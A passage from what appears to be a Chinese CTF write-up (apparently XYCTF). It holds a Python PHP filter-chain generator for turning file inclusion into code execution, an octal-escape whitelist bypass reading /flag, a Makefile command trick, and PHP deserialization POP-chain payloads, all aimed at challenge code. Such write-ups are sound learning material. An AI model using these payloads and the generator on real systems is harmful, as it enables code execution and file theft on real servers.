class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;K&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;k&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;M&#x27;</span>:<span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;m&#x27;</span>:<span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;N&#x27;</span>: <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Q&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Z&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;+&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_filter_chain</span>(<span class="params">chain, debug_base64 = <span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line">    encoded_chain = chain</span><br><span class="line">    <span class="comment"># generate some garbage base64</span></span><br><span class="line">    filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">    filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">    <span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">    filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> encoded_chain[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> debug_base64:</span><br><span class="line">        <span class="comment"># don&#x27;t add the decode while debugging chains</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">    final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> final_payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Parsing command line arguments</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;PHP filter chain generator.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&quot;--chain&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Content you want to generate. (you will maybe need to pad with spaces for your payload to work)&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--rawbase64&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.chain <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        chain = args.chain.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        base64_value = base64.b64encode(chain).decode(<span class="string">&#x27;utf-8&#x27;</span>).replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        chain = generate_filter_chain(base64_value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] The following gadget chain will generate the following code : &#123;&#125; (base64 value: &#123;&#125;)&quot;</span>.<span class="built_in">format</span>(args.chain, base64_value))</span><br><span class="line">        <span class="built_in">print</span>(chain)</span><br><span class="line">    <span class="keyword">if</span> args.rawbase64 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        rawbase64 = args.rawbase64.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">&quot;^([A-Za-z0-9+/])*$&quot;</span>, rawbase64)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">match</span>):</span><br><span class="line">            chain = generate_filter_chain(rawbase64, <span class="literal">True</span>)</span><br><span class="line">            <span class="built_in">print</span>(chain)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[-] Base64 string required.&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python3 php_filter_chain_generator.py --help             </span><br><span class="line">usage: php_filter_chain_generator.py [-h] [--chain CHAIN] [--rawbase64 RAWBASE64]</span><br><span class="line"></span><br><span class="line">PHP filter chain generator.</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  --chain CHAIN         Content you want to generate. (you will maybe need to pad with spaces for your payload to work)</span><br><span class="line">  --rawbase64 RAWBASE64</span><br><span class="line">                        The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.</span><br></pre></td></tr></table></figure>





<h1 id="ezRCE"><a href="#ezRCE" class="headerlink" title="ezRCE"></a>ezRCE</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function waf($cmd)&#123;</span><br><span class="line">    $white_list = [&#x27;0&#x27;,&#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&#x27;,&#x27;7&#x27;,&#x27;8&#x27;,&#x27;9&#x27;,&#x27;\\&#x27;,&#x27;\&#x27;&#x27;,&#x27;$&#x27;,&#x27;&lt;&#x27;]; </span><br><span class="line">    $cmd_char = str_split($cmd);</span><br><span class="line">    foreach($cmd_char as $char)&#123;</span><br><span class="line">        if (!in_array($char, $white_list))&#123;</span><br><span class="line">            die(&quot;really ez?&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $cmd;</span><br><span class="line">&#125;</span><br><span class="line">$cmd=waf($_GET[&quot;cmd&quot;]);</span><br><span class="line">system($cmd);</span><br></pre></td></tr></table></figure>

<p>八进制绕过即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#x27;\163\157\162\164&#x27;&lt;$&#x27;\57\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="ez-Make"><a href="#ez-Make" class="headerlink" title="ez?Make"></a>ez?Make</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sed -i &#x27;3,5d&#x27; [9-q][9-q][9-q][9-q][9-q][9-q][9-q][9-q].[9-q][9-q][9-q]</span><br><span class="line">cat /flag</span><br></pre></td></tr></table></figure>

<h1 id="εZ-¿м-Kε¿"><a href="#εZ-¿м-Kε¿" class="headerlink" title="εZ?¿м@Kε¿?"></a>εZ?¿м@Kε¿?</h1><p>大家经常会见到类似@ 、 @、@、^、$&lt;这种类型的变量。这种变量一般称为自动变量，自动变量是局部变量，作用域范围在当前的规则内，它们分别代表不同的含义：</p>
<p>$@：目标<br>$^：所有目标依赖<br>$&lt;：目标依赖列表中的第一个依赖<br>? ：所有目标依赖中被修改过的文件这里第一个依赖是就是 &#x2F; f l a g ( 注意 &#x3D; &#x3D; 坑点 &#x3D; &#x3D; ，之前不要试 ?：所有目标依赖中被修改过的文件 这里第一个依赖是就是 &#x2F;flag</p>
<p>配和报错带出即可 参照前面ezMake</p>
<p>坑点:这里两个<code>$$</code>才代表一个<code>$</code>$$(&lt;$&lt;)</p>
<h1 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token === <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pop</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pop</span>-&gt;<span class="title function_ invoke__">login</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = &amp;<span class="variable language_">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Flag</span>());</span><br></pre></td></tr></table></figure>

<p>fpclosefpclosefpcloseffflllaaaggg.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mack-&gt;<span class="title function_ invoke__">nonExistentMethod</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;o.O&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;luo;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$wang1</span>,<span class="variable">$wang2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;O.o&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_null</span>(<span class="variable">$this</span>-&gt;lao-&gt;chen) ? <span class="string">&quot;&quot;</span> : <span class="variable language_">$this</span>-&gt;lao-&gt;chen;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;xxxxx&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;学到就是赚到!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$data</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;num!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;旅行者别忘记旅行的意义!&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mack</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mack-&gt;<span class="title function_ invoke__">nonExistentMethod</span>(); <span class="comment">#触发__call</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$luo</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;o.O&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;luo;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>(); <span class="comment"># 触发__invoke</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$wang1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$wang1</span>, <span class="variable">$wang2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chen</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;O.o&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_null</span>(<span class="variable">$this</span>-&gt;lao-&gt;chen) ? <span class="string">&quot;&quot;</span> : <span class="variable language_">$this</span>-&gt;lao-&gt;chen;  <span class="comment">#触发__get</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;xxxxx&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$num</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;学到就是赚到!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$data</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name != <span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;num != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;旅行者别忘记旅行的意义!&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$zhou</span> =<span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="variable">$zhou</span>-&gt;name=<span class="keyword">new</span> <span class="title function_ invoke__">D</span>();</span><br><span class="line"><span class="variable">$zhou</span>-&gt;name-&gt;lao=<span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$zhou</span>-&gt;name-&gt;lao-&gt;luo=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$zhou</span>-&gt;name-&gt;lao-&gt;luo-&gt;mack=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$zhou</span>);</span><br></pre></td></tr></table></figure>

<p>saber_master_saber_master.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Liu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$T1ng</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$upsw1ng</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Liu</span>, <span class="variable">$T1ng</span>, <span class="variable">$upsw1ng</span> = Showmaker</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Liu = <span class="variable">$Liu</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;T1ng = <span class="variable">$T1ng</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;upsw1ng = <span class="variable">$upsw1ng</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XYCTFNO2</span></span></span><br><span class="line"><span 